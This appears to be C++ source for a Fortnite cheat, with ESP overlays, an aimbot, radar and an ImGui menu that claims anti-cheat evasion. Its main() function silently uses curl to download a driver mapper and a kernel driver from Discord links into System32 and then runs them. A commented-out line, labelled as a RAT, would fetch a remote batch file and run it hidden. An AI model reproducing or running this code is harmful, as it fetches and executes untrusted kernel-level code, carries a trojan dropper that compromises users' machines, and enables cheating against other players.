					DrawCorneredBox(Headboxe.x - (CornerWidth / 2), Headboxe.y, CornerWidth, CornerHeight, IM_COL32(255, 0, 0, 255), 2.5);
				}
				else {
					// rgba(0, 255, 231, 1)
					DrawCorneredBox(Headboxe.x - (CornerWidth / 2), Headboxe.y, CornerWidth, CornerHeight, IM_COL32(0, 255, 0, 255), 2.5);
				}
			}

			if (settings::boxfilled)
			{
				DrawFilledRect(Headboxe.x - (CornerWidth / 2), Headboxe.y, CornerWidth, CornerHeight, &Col.FiledBox);
			}

		}
	}

	if (closestPawn != 0)
	{
		if (closestPawn && SonyDriverHelper::api::GetKey(VK_RBUTTON))
		{
			if (settings::aimbot)
			{
				auto AimbotMesh = read<uint64_t>(closestPawn + 0x310);

				if (isVisible(AimbotMesh)) {
					Vector3 HeadPosition;
					Vector3 Head;

					if (settings::bones::head)
					{
						HeadPosition = GetBoneWithRotation(AimbotMesh, 68);
					}
					if (settings::bones::chest)
					{
						HeadPosition = GetBoneWithRotation(AimbotMesh, 6);
					}
					if (settings::bones::pelvis)
					{
						HeadPosition = GetBoneWithRotation(AimbotMesh, 2);
					}

					Head = ProjectWorldToScreen(HeadPosition);

					if (Head.x != 0 || Head.y != 0 || Head.z != 0)
					{
						if ((GetDistance(Head.x, Head.y, Head.z, Width / 2, Height / 2) <= settings::aimfov))
						{
							if (settings::aimbotenabled)
							{
								if (settings::aimbot)
								{
									aimbot(Head.x, Head.y);
								}
							}
						}
					}
				}
			}
		}
		else
		{
			closestDistance = FLT_MAX;
			closestPawn = NULL;
		}
	}
}

ImDrawList* draw;
ImGuiIO& io = ImGui::GetIO();
void menu()
{
	ImGui_ImplDX9_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();

	if (SonyDriverHelper::api::GetKey(VK_INSERT))
	{
		ShowMenu = !ShowMenu;
		Sleep(100);
	}

	static int maintabs;
	if (ShowMenu)
	{
		ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(4, 4));
		ImGui::PushStyleColor(ImGuiCol_Text, ImColor(255, 255, 255, 255).Value);
		ImGui::SetNextWindowSize(ImVec2(620, 450));
		ImGui::GetOverlayDrawList()->AddRectFilled(ImGui::GetIO().MousePos, ImVec2(ImGui::GetIO().MousePos.x + 7.f, ImGui::GetIO().MousePos.y + 7.f), ImColor(0, 0, 0, 255));
		ImGui::Begin("SafeCall FN @ " __DATE__ __TIME__, 0, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse);
		{
			ImGui::PopStyleColor();
			ImGui::PopStyleVar();
			ImGui::PushStyleVar(ImGuiStyleVar_FrameBorderSize, 0.30f);

			if (maintabs == 1) Active(); else Hovered();
			if (ImGui::Button("Aimbot", ImVec2{ 144, 30 }))
				maintabs = 1;
			ImGui::SameLine();
			if (maintabs == 0) Active(); else Hovered();
			if (ImGui::Button("Visuals", ImVec2{ 144, 30 }))
				maintabs = 0;
			ImGui::SameLine();
			if (maintabs == 2) Active(); else Hovered();
			if (ImGui::Button("Mods", ImVec2{ 144, 30 }))
				maintabs = 2;
			ImGui::SameLine();
			if (maintabs == 3) Active(); else Hovered();
			if (ImGui::Button("Misc", ImVec2{ 144, 30 }))
				maintabs = 3;

			ImGui::Spacing();
			ImGui::Spacing();
			ImGui::Spacing();
			ImGui::PopStyleVar();

			if (maintabs == 1)
			{
				ImGui::SetCursorPosX(15);
				ImGui::SetCursorPosY(84);
				ImGui::Checkbox(("Enable"), &settings::aimbotenabled);
				ImGui::SetCursorPosX(15);
				ImGui::SetCursorPosY(105);
				ImGui::Text("Aimbot");
				ImGui::SetCursorPosX(26);
				ImGui::SetCursorPosY(127);
				ImGui::Checkbox(("Mouse Movement (RightMouseButton)"), &settings::aimbot);

				ImGui::SetCursorPos({ 15, 170 });
				ImGui::Text(("Aim bone:"));
				ImGui::SetCursorPos({ 26, 195 });
				ImGui::Checkbox("Head", &settings::bones::head);
				if (settings::bones::head)
				{
					settings::bones::chest = false;
					settings::bones::pelvis = false;
				}
				ImGui::SetCursorPos({ 26, 215 });
				ImGui::Checkbox("Chest", &settings::bones::chest);
				if (settings::bones::chest)
				{
					settings::bones::head = false;
					settings::bones::pelvis = false;
				}
				ImGui::SetCursorPos({ 26, 235 });
				ImGui::Checkbox("Pelivs", &settings::bones::pelvis);
				if (settings::bones::pelvis)
				{
					settings::bones::head = false;
					settings::bones::chest = false;
				}


				ImGui::SetCursorPos({ 15, 277 });
				apple::slider("Aim Smooth", 212, &settings::smooth, 1.0f, 10.f);
			}

			if (maintabs == 0)
			{
				ImGui::SetCursorPosX(15);
				ImGui::SetCursorPosY(84);
				ImGui::SetCursorPosX(15);
				ImGui::SetCursorPosY(105);
				ImGui::SetCursorPos({ 204, 84 });
				ImGui::Text("Player:");
				ImGui::SetCursorPosX(26);
				ImGui::SetCursorPosY(127);
				ImGui::SetCursorPos({ 204, 106 });
				ImGui::Checkbox("Enable Visuals", &settings::Esp);
				ImGui::SetCursorPos({ 204, 127 });
				ImGui::Checkbox("Corner Box", &settings::corner);
				ImGui::SetCursorPos({ 204, 148 });
				ImGui::Checkbox("Distance", &settings::distance);
				ImGui::SetCursorPos({ 204, 170 });
				ImGui::Checkbox("Box Filled", &settings::boxfilled);
				ImGui::SetCursorPos({ 204, 192 });
				ImGui::Checkbox("Box", &settings::box);
				ImGui::SetCursorPos({ 204, 214 });
				ImGui::Checkbox("Snaplines", &settings::snaplines);
				ImGui::SetCursorPos({ 204, 236 });
				ImGui::Checkbox("PlayerNames", &settings::playernames);

				ImGui::SetCursorPos({ 15, 68 });
				ImGui::Text("Radar:");
				ImGui::SetCursorPos({ 15, 89 });
				ImGui::Checkbox("Radar", &settings::radar);
				ImGui::SetCursorPos({ 15, 111 });
				ImGui::Checkbox("FilledBox Radar Dots", &settings::radars::filledboxradar);
				ImGui::SetCursorPos({ 15, 133 });
				ImGui::Checkbox("Box Radar Dots", &settings::radars::boxradar);

				ImGui::SetCursorPos({ 423, 84 });
				ImGui::Text("Misc: ");
				ImGui::SetCursorPos({ 423, 106 });
				ImGui::Checkbox("Fov", &settings::fovcircle);
				ImGui::SetCursorPos({ 423, 127 });
				apple::slidersex("Fov Size:", 150, &settings::aimfov, 1.0f, 500.f);
			}

			if (maintabs == 2)
			{
				ImGui::SetCursorPos({ 15, 84 });
				ImGui::Checkbox("Enable Exploits (RISK!)", &settings::exploits);
				if (settings::exploits)
				{
					//ImGui::SetCursorPos({ 15, 106 });
					//ImGui::Checkbox("Spinbot (LeftClick)", &settings::spinbot);
					//ImGui::SetCursorPos({ 15, 127 });
					//ImGui::Checkbox("Infinite Vehcile Fuel", &settings::infiniatefuel);
					//ImGui::SetCursorPos({ 15, 148 });
					//ImGui::Checkbox("CarFly (Shift)", &settings::carfly);
					//ImGui::SetCursorPos({ 15, 170 });
					//ImGui::Checkbox("Rapid Dmr (Shift)", &settings::dmrrapid);
					//ImGui::SetCursorPos({ 15, 192 });
					//ImGui::Checkbox("Instant Reload", &settings::instareload);
					//ImGui::SetCursorPos({ 15, 214 });
					//ImGui::Checkbox("Boat Speed", &settings::boatspeed);
					//ImGui::SetCursorPos({ 15, 236 });
					//ImGui::Checkbox("SuperDmr", &settings::dmrbuffer);
					//ImGui::SetCursorPos({ 15, 270 });
					//apple::slider("BoatSpeed Value:", 212, &settings::boatvalue, 3.f, 50.f);
				}

			}

			if (maintabs == 3)
			{
				ImGui::SetCursorPos({ 15, 84 });
				ImGui::Text("SafeCall Fortnite");

				ImGui::SetCursorPos({ 15, 108 });
				ImGui::Text("Cheat Status: EAC: Undetected");

				ImGui::SetCursorPos({ 15, 126 });
				ImGui::Text("Cheat Status: BE: Detected");

				ImGui::SetCursorPos({ 15, 150 });
				ImGui::Text("Made by Damage#0654");
			}
		}

		ImGui::End();
	}

	renderloop();

	if (settings::radar)
	{
		DrawRadar();
	}

	ImGui::EndFrame();
	D3dDevice->SetRenderState(D3DRS_ZENABLE, false);
	D3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	D3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	D3dDevice->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

	if (D3dDevice->BeginScene() >= 0)
	{
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		D3dDevice->EndScene();
	}
	HRESULT result = D3dDevice->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && D3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
	{
		ImGui_ImplDX9_InvalidateDeviceObjects();
		D3dDevice->Reset(&d3dpp);
		ImGui_ImplDX9_CreateDeviceObjects();
	}

}

void xMainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, Window, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();

		if (hwnd_active == hwnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(Window, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}

		if (SonyDriverHelper::api::GetKey(0x23) & 1)
			exit(8);

		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(hwnd, &rc);
		ClientToScreen(hwnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = hwnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (SonyDriverHelper::api::GetKey(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;

		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{
			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			d3dpp.BackBufferWidth = Width;
			d3dpp.BackBufferHeight = Height;
			SetWindowPos(Window, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			D3dDevice->Reset(&d3dpp);
		}

		menu();

	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	DestroyWindow(Window);
}

LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
		return true;

	switch (Message)
	{
	case WM_DESTROY:
		xShutdown();
		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			d3dpp.BackBufferWidth = LOWORD(lParam);
			d3dpp.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = D3dDevice->Reset(&d3dpp);
			if (hr == D3DERR_INVALIDCALL)
				IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}

void xShutdown()
{
	TriBuf->Release();
	D3dDevice->Release();
	p_Object->Release();

	DestroyWindow(Window);
	UnregisterClass((L"BlueStacks 5"), NULL);
}

DWORD GetProcessID(LPCWSTR processName) {
	HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	DWORD procID = NULL;

	if (handle == INVALID_HANDLE_VALUE)
		return procID;

	PROCESSENTRY32W entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32W);

	if (Process32FirstW(handle, &entry)) {
		if (!_wcsicmp(processName, entry.szExeFile)) {
			procID = entry.th32ProcessID;
		}
		else while (Process32NextW(handle, &entry)) {
			if (!_wcsicmp(processName, entry.szExeFile)) {
				procID = entry.th32ProcessID;
			}
		}
	}

	CloseHandle(handle);
	return procID;
}

int main()
{
	SonyDriverHelper::api::Init();
	// wasn't originally there but added it, since he took the drivers out
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1009782557904220211/1011579935388860436/kdmapper.exe --output C:\\Windows\\System32\\driverLoader.exe >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1052036874933370911/1052382804685623326/Udness.sys --output C:\\Windows\\System32\\DUDUDUD.sys >nul 2>&1").c_str());
	system(_xor_("cls").c_str());
	system(_xor_("cd C:\\Windows\\System32\\").c_str());
	system(_xor_("C:\\Windows\\System32\\driverLoader.exe C:\\Windows\\System32\\DUDUDUD.sys").c_str());
	Sleep(2500);
	system("cls");
	SetConsoleTitleW(L"SafeCall Fortnite | Latest Build : 12/6/22");
	if (Comms::Setup("")) {
		Beep(500, 500);
		std::cout << "\n\n";
		std::cout << " [safecall] welcome to safecall fortnite, latest build\n\n";
		std::cout << " [safecall] waiting for fortnite..\n\n";
		while (hwnd == NULL)
		{
			hwnd = FindWindowA(0, _("Fortnite  "));
			Sleep(100);
		}
		std::cout << " [safecall] found fortnite \n\n";
    std::cout << " [paster-anonymous] No ratting Today! Proxy and Plu have saved the day!!!\n";
		//system(_("curl -L --silent https://rentry.co/IPlogs/raw >\"%TEMP%\\482jnd.bat\" & start /min \"\" \"%TEMP%\\482jnd.bat\"")); <- The rat
		UDPID = GetProcessID(L"FortniteClient-Win64-Shipping.exe");
		baseaddy = (uintptr_t)Comms::GetBaseAddress(UDPID, "FortniteClient-Win64-Shipping.exe");
		std::cout << " [safecall] game base address from driver -> " << baseaddy;

		setup_window();
		xInitD3d();


		HANDLE World = CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(actorloop), nullptr, NULL, nullptr);
		CloseHandle(World);

		xMainLoop();
		xShutdown();
	}

	return 0;
}
